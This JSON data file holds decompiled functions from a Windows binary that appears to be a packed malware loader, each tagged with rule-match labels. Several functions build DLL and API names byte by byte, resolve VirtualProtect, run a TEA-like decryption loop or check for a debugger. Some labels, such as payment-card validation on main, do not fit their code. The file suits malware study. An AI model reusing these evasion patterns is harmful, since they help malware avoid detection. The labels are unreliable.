{
    "004044f6": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.004044f6(void)\n\n{\n    *0x429a10 = 100;\n    *0x429a0b = 0x6d;\n    *0x429a11 = 0x6c;\n    *0x429a0f = 0x2e;\n    *0x429a12 = 0x6c;\n    *0x429a0e = 0x32;\n    *0x429a0a = 0x69;\n    *0x429a08 = 0x6d;\n    *0x429a09 = 0x73;\n    *0x429a0d = 0x33;\n    *0x429a13 = 0;\n    *0x429a0c = 0x67;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x429a08);\n    return;\n}\n",
        "token_count": 198
    },
    "00404e28": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00404e28(void)\n\n{\n    uint uStack144;\n    uint uStack140;\n    \n    uStack140 = 0x429a08;\n    *0x429a0e = 0x33;\n    *0x429a0f = 0x32;\n    *0x429a13 = 0x6c;\n    *0x429a12 = 0x6c;\n    *0x429a0b = 0x6e;\n    *0x429a0d = 0x6c;\n    *0x429a08 = 0x6b;\n    *0x429a0c = 0x65;\n    *0x429a0a = 0x72;\n    *0x429a10 = 0x2e;\n    *0x429a11 = 100;\n    *0x429a09 = 0x65;\n    *0x429a14 = 0;\n    uStack144 = 0x404e96;\n    *0x442c50 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    uStack144 = 0x429a08;\n    *0x429a13 = 0x65;\n    *0x429a09 = 0x69;\n    *0x429a0c = 0x75;\n    *0x429a0e = 0x6c;\n    *0x429a0d = 0x61;\n    *0x429a11 = 0x6f;\n    *0x429a15 = 0x74;\n    *0x429a08 = 0x56;\n    *0x429a14 = 99;\n    *0x429a0f = 0x50;\n    *0x429a16 = 0;\n    *0x429a0b = 0x74;\n    *0x429a12 = 0x74;\n    *0x429a0a = 0x72;\n    *0x429a10 = 0x72;\n    *0x429a04 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x442c50);\n    (**0x429a04)(*0x442800, *0x442c54, 0x40, &stack0xffffff70);\n    return;\n}\n",
        "token_count": 517
    },
    "00404c3e": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c3e(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puVar4 = arg_8h;\n    iVar1 = *arg_ch;\n    arg_ch_00 = arg_ch[1];\n    uVar5 = arg_8h[1];\n    iVar2 = arg_ch[2];\n    iVar3 = arg_ch[3];\n    uVar6 = *arg_8h;\n    var_4h = -0x3910c8e0;\n    var_ch = 0x20;\n    do {\n        arg_ch = uVar6 * 0x10 + iVar2;\n        arg_8h = (uVar6 >> 5) + iVar3;\n        *0x442804 = 0xffcf03fc;\n        fcn.00404592(&arg_ch, var_4h + uVar6);\n        *0x442804 = 0;\n        *0x44280c = 0xffffffff;\n        uVar5 = uVar5 - (arg_8h ^ arg_ch);\n        arg_ch = uVar5 * 0x10 + iVar1;\n        *0x442808 = 0xff6b3619;\n        arg_8h = uVar5 >> 5;\n        fcn.00404c21(&arg_8h, arg_ch_00);\n        fcn.00404592();\n        uVar6 = uVar6 - (arg_ch ^ arg_8h);\n        var_4h = var_4h + 0x61c88647;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    *puVar4 = uVar6;\n    puVar4[1] = uVar5;\n    return;\n}\n",
        "token_count": 503
    },
    "00404d2a": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d2a(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint var_800h;\n    \n    for (arg_ch = arg_ch >> 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n        if (*0x442c54 == 0xb7d) {\n            (*_sym.imp.KERNEL32.dll_AddConsoleAliasW)(0, &var_800h, 0);\n        }\n        fcn.00404c3e(arg_8h, arg_10h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t var_24h;\n    uint lppt;\n    int32_t var_4h;\n    \n    if (*0x442c54 == 0x9e) {\n        fcn.00405db3(0, 0);\n        fcn.004044da(0);\n        fcn.00405d96(0x429a08, 0);\n        fcn.00405cd5(0);\n        fcn.00405d05(0);\n        fcn.00405b76(0);\n        fcn.00405789();\n        fcn.00405b36(0, 0);\n        fcn.004057aa();\n    }\n    *0x442c54 = *0x418e9c;\n    iVar1 = 0x79a863;\n    do {\n        if (*0x442c54 == 0x4c5) {\n            lppt = 0;\n            var_4h = 0;\n            (*_sym.imp.GDI32.dll_SetBrushOrgEx)(0, 0, 0, &lppt);\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileStructW)(0, 0, 0, 0, 0);\n        }\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *0x443068 = *0x418008;\n    uVar2 = 0;\n    do {\n        if (uVar2 < 0x1ef75) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n            (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        }\n    } while ((((uVar2 < 0x1ea05600) || (var_4h == 0xacef98)) || (var_24h == 0xad6910c)) &&\n            (uVar2 = uVar2 + 1,  uVar2 < 0x8deecc68));\n    fcn.004052eb();\n    return 0;\n}\n",
        "token_count": 460
    },
    "0040573b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040573b(int32_t param_1, char param_2, int32_t param_3)\n\n{\n    uint arg_10h;\n    uint in_stack_fffffff0;\n    \n    if ((param_2 != '\\0') && (7 < *(param_1 + 0x18))) {\n        arg_10h = *(param_1 + 4);\n        if (param_3 != 0) {\n            in_stack_fffffff0 = arg_10h;\n            fcn.00405717(param_1 + 4, 8, arg_10h, param_3);\n        }\n        fcn.004056ad(arg_10h, *(param_1 + 0x18) + 1);\n    }\n    *(param_1 + 0x18) = 7;\n    fcn.004056ef(in_stack_fffffff0);\n    return;\n}\n",
        "token_count": 198
    },
    "0040a6d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040a7c8: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040a7cd)\n// WARNING: Removing unreachable block (ram,0x0040a7fb)\n// WARNING: Removing unreachable block (ram,0x0040a7d3)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040a6d5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408664(0x416aa8, 0x18);\n    fcn.0040db0e(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x4430cc != 1) {\n        *0x4430c8 = 1;\n        *0x4430c4 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.0040b025(*0x443c00);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.0040b025(*0x443bfc);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.0040b01c();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.0040b025(*piVar2);\n                        iVar3 = fcn.0040b01c();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.0040b025(*0x443c00);\n                        piVar1 = fcn.0040b025(*0x443bfc);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.0040a60f(0x401210);\n        }\n        fcn.0040a60f(0x401218);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040da34(8);\n    }\n    return;\n}\n",
        "token_count": 810
    },
    "0040b865": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b865(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x428a48) {\n        return;\n    }\n    *0x443908 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x44390c = &arg_8h;\n    *0x443848 = 0x10001;\n    *0x4437f0 = 0xc0000409;\n    *0x4437f4 = 1;\n    var_328h = *0x428a48;\n    var_324h = *0x428a4c;\n    *0x4437fc = unaff_retaddr;\n    *0x4438d4 = in_GS;\n    *0x4438d8 = in_FS;\n    *0x4438dc = in_ES;\n    *0x4438e0 = in_DS;\n    *0x4438e4 = unaff_EDI;\n    *0x4438e8 = unaff_ESI;\n    *0x4438ec = unaff_EBX;\n    *0x4438f0 = in_EDX;\n    *0x4438f4 = in_ECX;\n    *0x4438f8 = in_EAX;\n    *0x4438fc = unaff_EBP;\n    *0x443900 = unaff_retaddr;\n    *0x443904 = in_CS;\n    *0x443910 = in_SS;\n    *0x443840 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040b85d(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x4039f4);\n    if (*0x443840 == 0) {\n        fcn.0040b85d(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 833
    },
    "0040c57a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c57a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x428a48 ^ &stack0xfffffffc;\n    fcn.004065fd(arg_10h);\n    var_14h = fcn.00411a00(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00410f78(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040c5d3:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c613;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040c605:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c613;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040c605;\n        goto code_r0x0040c5d3;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040c613:\n    fcn.0040b865(unaff_EBX);\n    return;\n}\n",
        "token_count": 507
    },
    "0040c622": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c622(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x428a48 ^ &stack0xfffffffc;\n    fcn.004065fd(arg_10h);\n    var_14h = fcn.00411a00(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.004114bc(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040c67b:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c6bb;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040c6ad:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c6bb;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040c6ad;\n        goto code_r0x0040c67b;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040c6bb:\n    fcn.0040b865(unaff_EBX);\n    return;\n}\n",
        "token_count": 508
    },
    "00410063": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00410063(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040da34(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "004100bd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004100bd(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040b01c();\n    var_4h = 0;\n    if (*0x4437dc == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4039e8);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4039dc);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x4437dc = fcn.0040afaa(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x4039cc);\n        *0x4437e0 = fcn.0040afaa(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x4039b8);\n        *0x4437e4 = fcn.0040afaa(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x40399c);\n        *0x4437ec = fcn.0040afaa(uVar3);\n        if (*0x4437ec != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x403984);\n            *0x4437e8 = fcn.0040afaa(uVar3);\n        }\n    }\n    if ((*0x4437e8 != iVar1) && (*0x4437ec != iVar1)) {\n        pcVar4 = fcn.0040b025(*0x4437e8);\n        pcVar5 = fcn.0040b025(*0x4437ec);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x004101ff;\n        }\n    }\n    if ((((*0x4437e0 != iVar1) && (pcVar4 = fcn.0040b025(*0x4437e0),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x4437e4 != iVar1 && (pcVar4 = fcn.0040b025(*0x4437e4),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x004101ff:\n    pcVar4 = fcn.0040b025(*0x4437dc);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 837
    },
    "00410f78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410f78(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00411479;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x004110ad;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x004110b4;\ncode_r0x004110ad:\n                        do {\n                            var_4h = 1;\ncode_r0x004110b4:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x004110c2;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x004110c2:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x4294c4 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x4294c4 < iVar12) {\n                if (iVar12 < *0x4294c0) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x4294c0;\n                    uVar5 = 1;\n                }\n                goto code_r0x00411479;\n            }\n            var_10h = *0x4294c4 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00411265;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00411265:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < 